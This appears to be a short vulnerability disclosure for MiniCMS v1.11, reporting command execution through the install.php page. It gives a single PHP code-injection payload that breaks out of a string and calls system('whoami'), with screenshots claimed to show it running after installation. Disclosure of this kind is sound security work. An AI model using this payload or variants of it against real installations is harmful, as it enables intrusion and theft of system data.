#### BUG_AUTHOR:acmglz
# MiniCMS exists command execution
## Download address:
https://github.com/bg5sbk/MiniCMS/releases/tag/v1.11
## Version:V1.11
## Tested on: PHP, Apache, MySQL
## Affected Page:
install.php

Attackers can exploit command execution vulnerabilities to obtain sensitive information about systems and applications, including passwords, user accounts, databases, and more

## Proof of vulnerability:
## Payload：

payload

```
)');system('whoami');//
```

## Trigger popup：
![image](https://github.com/user-attachments/assets/0b5aed9f-68ca-4a69-bd92-cd1fda926b6f)


After installation, you can view that the command is successfully executed

![image](https://github.com/user-attachments/assets/9bfc7285-54a4-4bbd-90e0-1cd05111dc2f)

